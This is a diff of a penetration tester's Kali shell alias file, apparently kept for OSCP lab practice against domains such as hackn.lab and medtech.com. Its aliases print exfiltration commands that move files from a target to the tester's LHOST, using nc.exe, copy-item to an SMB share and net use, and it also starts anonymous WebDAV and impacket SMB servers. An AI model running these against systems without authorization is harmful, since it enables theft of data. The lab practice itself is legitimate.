@@ -2,8 +2,8 @@
 #$DOMAIN = hackn.lab or medtech.com
 #$DC = server01.hackn.lab or dc01.medtech.com
 # alias example='(){ echo Your arg was $1. ;}'
-export RHOST="192.168.162.153"
-export LHOST="192.168.45.165"
+export RHOST="192.168.197.153"
+export LHOST="192.168.45.158"
 export RPORT=""
 export LPORT=""
 export USERNAME=""
@@ -25,7 +25,7 @@ alias setpassword='(){/home/kali/setpassword.py "$1" && source /home/kali/.kali}
 alias setlport='(){/home/kali/setlport.py "$1" && source /home/kali/.kali}'
 #alias setcwd='hash -d cwd=`pwd`'
 alias setcwd='(){/home/kali/setcwd.py "$1" && source /home/kali/.kali}'
-export cwd="/home/kali/Documents/OSCP_C/AD/192.168.183.153"
+export cwd="/home/kali/Documents/OSCP_C/AD/internal"
 alias cwd='cd "$cwd"'
 alias s='(){grep -i "$1" /home/kali/.kali --color}'
 alias o='gedit /home/kali/.kali &'
@@ -61,7 +61,7 @@ alias startWebDav='(){wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /
 alias wtransfer='(){echo copy-item "$1"\\\\\\"$LHOST"\\share\\"$1"}'
 alias wtransfernc='(){echo "nc.exe "$LHOST" "$LPORT" -w 3 < "$1""}'
 alias wtransfernc_kali='echo nc -lvp "$LPORT" > FiletoDownload'
-alias smbsrv='impacket-smbserver -smb2support -username kali -password kali share .' #transfer
+alias smbsrv='printf '%s' "net use \\\\$LHOST\share /user:kali kali " ;impacket-smbserver -smb2support -username kali -password kali share .' #transfer
 alias smbtransfer_REQUIRED="echo net use '\\\\\\'"$LHOST"'\\'share /user:kali kali"
 alias smbtransfer='(){echo copy-item "$1" \\\\\\"$LHOST":445\\share\\"$1"}' # MUST USE NET USE FIRST TO CONNECT
 
